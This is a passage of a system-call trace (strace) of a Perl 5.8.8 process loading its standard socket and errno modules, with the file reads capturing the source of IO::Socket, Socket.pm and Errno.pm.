scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
6823  07:15:42.845358 stat64("/etc/perl/Socket.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.845375 stat64("/etc/perl/Socket.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.845475 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.845512 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.845543 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.845556 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.845574 stat64("/usr/lib/perl5/Socket.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.845587 stat64("/usr/lib/perl5/Socket.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.845600 stat64("/usr/share/perl5/Socket.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.845613 stat64("/usr/share/perl5/Socket.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.845626 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.845639 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
6823  07:15:42.845660 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.845674 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.845686 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.845704 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
6823  07:15:42.846110 brk(0x8239000)    = 0x8239000
6823  07:15:42.846319 read(8, "", 4096) = 0
6823  07:15:42.846334 close(8)          = 0
6823  07:15:42.846425 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
6823  07:15:42.846451 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6823  07:15:42.846540 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
6823  07:15:42.846555 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
6823  07:15:42.846647 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
6823  07:15:42.846666 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7db8000
6823  07:15:42.846683 mmap2(0xb7dbd000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7dbd000
6823  07:15:42.846702 close(8)          = 0
6823  07:15:42.847446 brk(0x825a000)    = 0x825a000
6823  07:15:42.847563 stat64("/etc/perl/Errno.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.847581 stat64("/etc/perl/Errno.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.847596 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.847609 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.847623 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.847636 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.847650 stat64("/usr/lib/perl5/Errno.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.847663 stat64("/usr/lib/perl5/Errno.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.847676 stat64("/usr/share/perl5/Errno.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.847689 stat64("/usr/share/perl5/Errno.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.847703 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.847738 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
6823  07:15:42.847762 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.847777 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.847790 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.847811 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
6823  07:15:42.849255 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
6823  07:15:42.849721 _llseek(8, 5966, [5966], SEEK_SET) = 0
6823  07:15:42.849739 _llseek(8, 0, [5966], SEEK_CUR) = 0
6823  07:15:42.849750 close(8)          = 0
6823  07:15:42.850178 brk(0x827b000)    = 0x827b000
6823  07:15:42.850308 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
6823  07:15:42.850813 _llseek(6, 6698, [6698], SEEK_SET) = 0
6823  07:15:42.850829 _llseek(6, 0, [6698], SEEK_CUR) = 0
6823  07:15:42.850840 close(6)          = 0
6823  07:15:42.850860 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.850875 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.850890 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
